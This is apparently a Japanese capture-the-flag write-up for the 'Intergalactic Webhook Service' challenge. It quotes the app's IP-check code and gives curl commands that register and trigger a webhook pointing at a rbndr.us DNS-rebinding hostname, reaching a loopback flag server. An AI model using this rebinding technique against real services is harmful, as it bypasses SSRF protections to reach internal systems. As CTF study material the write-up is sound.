## Intergalactic Webhook Service
### 問題文
```
I got tired of creating webhooks from online sites, so I made my own webhook service! It even works in outer space! Be sure to check it out and let me know what you think. I'm sure it is the most secure webhook service in the universe.

https://supernova.sunshinectf.games/
```
### 添付ファイル
`src.zip`

### 解き方
1. ソースコードを見るとDNSリバインディング攻撃がが利用できそうなことがわかる。

2. src/app.pyの以下の記述から`http://127.0.0.1:5001/flag` にPOSTリクエストを送信できれば、フラグを取得できることがわかる。
```py
FLAG = load_flag()

class FlagHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        # /flag へのPOSTリクエストに対してフラグを返す
        if self.path == '/flag':
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(FLAG.encode())
        # ...

# 127.0.0.1:5001 でフラグサーバーを起動
threading.Thread(target=lambda: HTTPServer(('127.0.0.1', 5001), FlagHandler).serve_forever(), daemon=True).start()

app = Flask(__name__)

# ...

def is_ip_allowed(url):
    # ...
    # URLのホスト名をIPアドレスに解決
    ip = socket.gethostbyname(host)
    ip_obj = ipaddress.ip_address(ip)
    # プライベートIPやループバックIPを禁止
    if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local or ip_obj.is_reserved:
        return False, f'IP "{ip}" not allowed'
    return True, None
```

3. `rbndr.us` を利用して攻撃用のリンクを作成し、登録する。
```sh
curl -X POST https://supernova.sunshinectf.games/register -d 'url=http://7f000001.08080808.rbndr.us:5001/flag'
```
成功時のレスポンス
```sh
{"id":"62b2f898-c0ca-4f71-94a7-5cb3c1d62af0","status":"registered","url":"http://7f000001.08080808.rbndr.us:5001/flag"}
```
4. 登録したIDをもとにWebhookをトリガーし、DNSリバインディング攻撃を行い、flagを入手する。
```sh
curl -X POST https://supernova.sunshinectf.games/trigger -d 'id=980660b3-5307-417b-a0ed-ba00c1ab367e'
```
成功時のレスポンス
```sh
{"response":"sun{dns_r3b1nd1ng_1s_sup3r_c00l!_ff4bd67cd1}","status":200,"url":"http://7f000001.08080808.rbndr.us:5001/flag"}
```

### 補足
手順3,4はタイミングによって成功するかどうか変わってくるので何度か行う。
なんでこれ10点なん?